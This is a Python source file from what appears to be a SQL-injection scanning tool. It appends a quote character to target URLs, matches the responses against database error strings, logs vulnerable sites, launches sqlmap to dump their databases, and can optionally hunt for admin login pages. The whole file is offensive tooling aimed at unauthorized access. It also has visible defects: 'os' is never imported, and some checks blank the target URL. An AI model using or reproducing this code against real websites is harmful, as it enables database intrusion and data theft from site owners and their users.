import urllib.request as req
from urllib.error import URLError, HTTPError
from termcolor import *
import docs.adminfinder
def cheaker(site,choice2):
	if site.startswith("https")==True: #you can add # before this line and the line after this line (6,7) if you want https results
		site=""
	if site[-4:-3] == ".":
		site=""
	try:
		opnurl=req.urlopen(site+"%27")
		pagescr=str(opnurl.read(100000))
	except HTTPError as err:
		pagescr=""
		pass
	except URLError as err:
		pagescr=""
		pass
	except ValueError as err:
		pagescr=""
		pass
	
	with open("docs/err_list.txt","r+") as errors:
		for error in errors:
			error=error.replace("\n","")
			if error in pagescr:
				print(colored("    Site Vulnerable=>  ","blue")+site)
				with open("injectable_sites.txt",mode="a") as injsitesf:
					injsitesf.write(site+"%27"+"\n")
				os.system('gnome-terminal -x sh -c "sqlmap -u '+site+' --dbs"')
				if choice2 =="Y" or choice2 =="y":
					print(colored(" [Finding Admin Login] ","yellow").center(60,"-"))
					docs.adminfinder.adminfind(site)
				break
            
